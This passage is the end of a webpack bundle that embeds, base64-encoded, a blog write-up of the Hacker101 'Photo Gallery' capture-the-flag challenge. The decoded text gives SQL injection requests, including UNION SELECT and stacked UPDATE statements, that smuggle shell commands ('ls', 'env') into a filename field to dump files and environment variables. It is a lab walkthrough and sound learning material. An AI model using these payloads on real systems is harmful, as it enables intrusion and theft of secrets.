MDFhODA0NjcwYjk0OTdlY2M3ODJjYTExZmFgXFxuXFxuZGVjcnlwdGVkOiBgXFxcXCp8fCtscystYSt0bXAudHh0YFxcbmFub3RoZXIgZmlsZSEgbmljZSBsZXRzIHRyeSBhbmQgZ2V0IHRoYXQgd2l0aCBhIFVOSU9OIFNUQVRFTUVOVCByZXF1ZXN0IGxpa2Ugc286XFxuXFxuYEdFVCAvYWQzZThjN2RmOS9mZXRjaD9pZD00IFVOSU9OIFNFTEVDVCAndG1wLnR4dCctLSBIVFRQLzEuMWBcXG5obW0gbm8gbHVjayBpdCBzZWVtcy4uLiBsZXQncyBkbyBpdCBhbm90aGVyIHdheS5cXG5cXG5Gcm9tIG91ciBwcmV2aW91cyBmaW5kaW5ncyB3ZSBrbm93IHRoYXQgZmlsZXMgYXJlIGluIHRoZSAnZmlsZXMnIGRpcmVjdG9yeSBhbmQgdGhhdCB3ZSBjYW4gcnVuIHNxbCBzdGF0ZW1lbnRzIG9uIHRoZSBpZCBwYXJhbS4gU28gd2Ugd2FudCB0byB0cnkgdG8gbW92ZSB0aGUgZmlsZSBvciBpdHMgY29udGVudHMgc28gd2UgY2FuIGFjY2VzcyBpdC4gV2UgYWxzbyBnb3QgYSBuZXcgaGludCBvZiB1c2luZyBscyBvdXRwdXQgdG8gZmluZCB0ZW1wIGZpbGUuXFxuXFxuV2Ugd2FudCB0byBydW4gZm9sbG93aW5nIHN0YXRlbWVudHMgdmlhIHRoZSB2dWxuZXJhYmxlIHBhcmFtOlxcblxcbiMjIyMgbHMgaW4gdGhlIC9maWxlcyBkaXJlY3RvcnkgYW5kIHN0b3JlIGRhdGEgaW4gYmlnV2luLnR4dFxcblxcbmB1cGRhdGUgcGhvdG9zIHNldCBmaWxlbmFtZT0nKiB8fCBscyAuL2ZpbGVzID5iaWdXaW4udHh0ICcgd2hlcmUgaWQ9MzsgY29tbWl0O2BcXG5cXG5gR0VUIC9hZDNlOGM3ZGY5L2ZldGNoP2lkPTE7JTIwdXBkYXRlJTIwcGhvdG9zJTIwc2V0JTIwZmlsZW5hbWU9JTI3XFxcXColMjB8fCUyMGxzJTIwLi9maWxlcyUyMCUzRWJpZ1dpbi50eHQlMjAlMjclMjB3aGVyZSUyMGlkPTM7JTIwY29tbWl0OyUyMC0tIEhUVFAvMS4xYFxcblxcbiMjIyMgc3RvcmUgYWxsIGVudiBkYXRhIGluIGJpZ1dpbi50eHQgKGJlY2F1c2Ugc28gb2Z0ZW4gZmxhZ3MgYXJlIGhlcmUpXFxuXFxuYHVwZGF0ZSBwaG90b3Mgc2V0IGZpbGVuYW1lPScqIHx8IGVudiA+YmlnV2luLnR4dCcgd2hlcmUgaWQ9MzsgY29tbWl0O2BcXG5cXG5gR0VUIC9hZDNlOGM3ZGY5L2ZldGNoP2lkPTE7JTIwdXBkYXRlJTIwcGhvdG9zJTIwc2V0JTIwZmlsZW5hbWUlM0QlMjcqJTIwJTdDJTdDJTIwZW52JTIwJTNFdG1wLnR4dCUyNyUyMHdoZXJlJTIwaWQlM0QzJTNCJTIwY29tbWl0JTNCJTIwLS0gSFRUUC8xLjFgXFxuXFxuYWZ0ZXIgeW91IHN1Y2NzZXNzZnVsbHkgcmFuIHRob3NlIHlvdSBzaG91bGQgYmUgYWJsZSB0byBydW4gdGhlIHVuaW9uIHNlbGVjdCBhZ2FpbiB0byBnZXQgYWhvbGQgb2YgYmlnV2luLnR4dCFcXG5cXG5gR0VUIC9hZDNlOGM3ZGY5L2ZldGNoP2lkPTQgVU5JT04gU0VMRUNUICdiaWdXaW4udHh0Jy0tIEhUVFAvMS4xYFxcblxcblRhZGFhISEgd2UgZ290IGl0IGFsbC5cXG5cXG5gYGBiYXNoXFxuXFxcIl5GTEFHXjllZjhmYzVkYTE1Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz83ODJjYTExZmEkRkxBRyRcXFwiXFxuXFxcIl5GTEFHXjYzYTQwN2QwMDgzPz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz80NTY0ZWU5ZjIkRkxBRyRcXFwiXFxuSE9TVE5BTUU9YWQzZThjN2RmOTJkXFxuU0hMVkw9MFxcbmBgYFxcblwiOyJdLCJzb3VyY2VSb290IjoiIn0=\n//# sourceURL=webpack-internal:///./md/blog/hacker101-ctf-photo-gallery.md\n");

/***/ })

};;